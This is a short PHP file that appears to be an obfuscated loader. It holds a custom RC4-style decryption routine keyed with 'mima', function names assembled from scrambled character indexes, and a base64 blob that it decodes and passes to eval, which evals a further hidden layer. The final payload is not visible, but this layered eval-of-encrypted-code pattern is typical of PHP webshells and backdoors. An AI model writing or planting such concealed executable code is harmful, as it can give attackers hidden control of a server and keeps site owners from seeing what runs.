<?php 


function asciitostr($sacii){$asc_arr= str_split(strtolower($sacii),2);$str='';for($i=0;$i<count($asc_arr);$i++){$str.=chr(hexdec($asc_arr[$i][1].$asc_arr[$i][0]));}return mb_convert_encoding($str,'UTF-8','GB2312');}
 function encrypt($string,$operation,$key='')
  {
    $key=md5($key);
    $key_length=strlen($key);
    $string=$operation=='D'?base64_decode($string):substr(md5($string.$key),0,8).$string;
    $string_length=strlen($string);
    $rndkey=$box=array();
    $result='';
    for($i=0;$i<=255;$i++)
    {
      $rndkey[$i]=ord($key[$i%$key_length]);
      $box[$i]=$i;
    }
    for($j=$i=0;$i<256;$i++)
    {
      $j=($j+$box[$i]+$rndkey[$i])%256;
      $tmp=$box[$i];
      $box[$i]=$box[$j];
      $box[$j]=$tmp;
    }
    for($a=$j=$i=0;$i<$string_length;$i++)
    {
      $a=($a+1)%256;
      $j=($j+$box[$a])%256;
      $tmp=$box[$a];
      $box[$a]=$box[$j];
      $box[$j]=$tmp;
      $result.=chr(ord($string[$i])^($box[($box[$a]+$box[$j])%256]));
    }
    if($operation=='D')
    {
      if(substr($result,0,8)==substr(md5(substr($result,8).$key),0,8))
      {
        return substr($result,8);
      }
      else
      {
        return'';
      }
    }
    else
    {
      return str_replace('=','',base64_encode($result));
    }
  }

$id = "yTKTBFfoj6AU4qsnucxp2OUNU9nb5AvFJZhqEqKsktDPIj0jbmsXwVoQRqQ8eyUPtBaNX1QOrj5xK6qWLB2IXV0vAjQVzjTuC7cdmazeaOkrAshuglEdh5cP3S/8bTAYM14pf0xmbb/ub1E+yxEoSnwA";


$a="Je8B5s7wI5B2S2b521JE8wTzAwMD0iaE5zRW1JcWlmV3VRRFpTa1ZvZ0ZsVWR4WW5yeVBLT3p0anZiSEdhSnBNQkFYd1RMY0NSZXh2VGZNSmxLckN3UEhJVU5TYmNpcUFZc2FRVkdnV2hwRG16QlpGT2VMdXlvalJua2RYdEVnSDlST1pvdlhLdE11bnRRZ1VlTUladnhFMnR4ZDJ0eGQydHBhUzlOZDJpOUptVHZYS3RNdW5TUWdVZXhkMnQ3ZDJpTmFqdk5hanZySUZJTUladjlKbVR2WEt0MElDMVJnVWV4ZDJ0TUkzdEdJallzdW11MHZuYTNoSE5SRWpTTEIzeVRPMkxiQk1lMkkySW1ZTXRNSTNQS2hSMFdlWnlHSVM5TUJGaVFnVWVNQkZpUUVHSjdIUGJOZEY5cGoySVRhQ2Q5SlEwS2hSMFdlRklUYUNkOUpLSjdIUExNQjNKYmVGTjl1SFROT25ScHVtVE5PVVRWV2pUdlhjTk5CUVNESkgwY0JqdHJkTWl3SVhjUmtIdVJXblR2WGNOTklNc3hJcDBOSU1zeElHNE5ZRlNEZGlUTkJRU0RqblR2WGNOTkltZjB2bTBLSUNKc2huZFJ1cE4wYW5QcHVubzB2bmEwdm5jMHVwTjV2TWYwdUZ1MkluY0toUjBXclAwV2VGYXNhQ2Q5ZVp5R0lTOU1CRmlRa0t0TXVuUDJrS3RSQjN2cklNc3hJcFR2WG04KyI7ZXZhbCgnPz4nLiRPMDBPME8oJE8wT08wMCgkT08wTzAwKCRPME8wMDAsJE9PMDAwMCoyKSwkT08wTzAwKCRPME8wMDAsJE9PMDAwMCwkT08wMDAwKSwkT08wTzAwKCRPME8wMDAsMCwkT08wMDAwKSkpKTs=Je8B5s7wI5B2S2b521";$O00OO0=urldecode(encrypt($id, "D", "mima"));$O00O0O=$O00OO0{3}.$O00OO0{6}.$O00OO0{33}.$O00OO0{30};$O0OO00=$O00OO0{33}.$O00OO0{10}.$O00OO0{24}.$O00OO0{10}.$O00OO0{24};$OO0O00=$O0OO00{0}.$O00OO0{18}.$O00OO0{3}.$O0OO00{0}.$O0OO00{1}.$O00OO0{24};$OO0000=$O00OO0{7}.$O00OO0{13};$O00O0O.=$O00OO0{22}.$O00OO0{36}.$O00OO0{29}.$O00OO0{26}.$O00OO0{30}.$O00OO0{32}.$O00OO0{35}.$O00OO0{26}.$O00OO0{30};eval($O00O0O( str_replace(asciitostr("A45683245337737794532423352326532313"),"",$a)));
 ?>